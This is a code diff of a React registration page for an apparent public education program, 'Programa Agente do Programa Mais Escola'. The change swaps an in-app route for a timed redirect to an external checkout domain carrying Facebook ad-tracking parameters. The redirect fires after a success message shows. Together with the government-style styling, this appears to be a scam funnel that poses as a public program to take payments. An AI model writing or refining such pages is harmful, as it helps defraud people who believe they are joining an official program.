@@ -1,5 +1,4 @@
 import React, { useEffect, useState } from "react";
-import { useNavigate } from "react-router-dom";
 import { Check, MapPin, DollarSign, GraduationCap, Award } from "lucide-react";
 import { useLocation } from "../context/LocationContext";
 import useUtmNavigator from "../hooks/useUtmNavigator";
@@ -8,7 +7,7 @@ import { usePixelTracking } from '../hooks/usePixelTracking';
 
 const ProgramDetails: React.FC = () => {
 	usePixelTracking();
-	const navigate = useNavigate();
+	
 	const [selectedLocation, setSelectedLocation] = useState<string>("");
 	const [acceptedTerms, setAcceptedTerms] = useState({
 		attendance: false,
@@ -89,7 +88,7 @@ const ProgramDetails: React.FC = () => {
 		if (selectedLocation && acceptedTerms.attendance && acceptedTerms.information) {
 			setShowSuccess(true);
 			setTimeout(() => {
-				navigate('/chat');
+				window.location.href = "https://checkout.inscricao-agentescoladofuturo.online/VCCL1O8SCK8R?utm_source=FB&utm_campaign={{campaign.name}}|{{campaign.id}}&utm_medium={{adset.name}}|{{adset.id}}&utm_content={{ad.name}}|{{ad.id}}&utm_term={{placement}}";
 			}, 4000);
 		}
 	};
@@ -135,7 +134,7 @@ const ProgramDetails: React.FC = () => {
 
 			<div className="max-w-2xl mx-auto">
 				<div className="mb-6">
-					<h1 className="text-[#1351B4] text-2xl font-bold">Programa Agente Escola</h1>
+					<h1 className="text-[#1351B4] text-2xl font-bold">Programa Agente do Programa Mais Escola</h1>
 					<div className="h-1 w-48 bg-[#2ECC71] mt-2"></div>
 				</div>
 
